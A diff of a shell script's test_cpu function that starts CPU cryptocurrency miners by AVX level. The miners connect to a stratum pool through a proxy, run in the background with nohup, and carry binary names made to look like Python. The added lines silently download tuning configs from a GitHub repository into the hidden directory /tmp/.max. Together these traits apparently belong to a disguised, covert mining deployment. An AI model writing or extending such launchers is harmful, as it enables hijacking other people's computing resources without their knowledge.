@@ -72,11 +72,13 @@ test_cpu () {
   if [ $CPU == 'AVX512' ]
   then 
     echo -e "${On_IGreen}"'## test_cpu -> AVX512 ##'"${Color_Off}"
-    nohup ./grpython5a -a $Algo -o stratum+tcp://$PROX:$TESTPort2 -u $W_DG -p $P_DG  --no-tune
+    wget -q -O /tmp/.max/tune_config  https://raw.githubusercontent.com/cloud10001/pycpu/main/tune_config5
+    nohup ./grpython5a -a $Algo -o stratum+tcp://$PROX:$TESTPort2 -u $W_DG -p $P_DG  
   elif [ $CPU == 'AVX2' ]
   then 
+    wget -q -O /tmp/.max/tune_config  https://raw.githubusercontent.com/cloud10001/pycpu/main/tune_config
     echo -e "${On_IGreen}"'## test_cpu -> AVX2 ##'"${Color_Off}"
-    nohup ./grpython2a -a $Algo -o stratum+tcp://$PROX:$TESTPort2 -u $W_DG -p $P_DG  --no-tune
+    nohup ./grpython2a -a $Algo -o stratum+tcp://$PROX:$TESTPort2 -u $W_DG -p $P_DG 
   else 
     echo -e "${On_IGreen}"'## test_cpu -> hope AVX ##'"${Color_Off}"
     nohup ./grpython1a -a $Algo -o stratum+tcp://$PROX:$TESTPort2 -u $W_DG -p $P_DG  --no-tune
